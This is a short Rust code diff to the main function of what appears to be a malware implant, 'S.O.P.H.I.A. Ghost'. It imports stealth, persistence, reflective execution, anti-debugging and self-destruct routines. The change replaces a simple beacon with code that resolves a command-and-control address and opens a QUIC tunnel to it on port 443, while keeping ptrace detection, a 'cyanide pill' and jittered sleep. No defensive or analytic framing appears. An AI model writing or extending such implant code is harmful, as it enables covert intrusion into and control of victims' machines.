@@ -9,8 +9,9 @@ use stealth::{masquerade, setup_persistence, reflective_exec};
 use comm::Oracle;
 use defense::{check_ptrace, trigger_cyanide_pill, set_self_destruct};
 
+#[tokio::main]
 #[obfuscate]
-fn main() {
+async fn main() {
     set_self_destruct();
     if check_ptrace() {
         trigger_cyanide_pill();
@@ -21,8 +22,11 @@ fn main() {
 
     let vault = GhostVault::new();
     let oracle = Oracle::new();
-    let _c2_ip = oracle.resolve_c2();
-    oracle.beacon();
+    let c2_ip = oracle.resolve_c2();
+
+    if let Ok(addr) = format!("{}:443", c2_ip).parse() {
+        let _ = oracle.establish_quic_tunnel(addr).await;
+    }
 
     let sleep_time = oracle.get_jitter_sleep();
     println!("S.O.P.H.I.A. Ghost initialized. Jitter sleep: {:?}.", sleep_time);
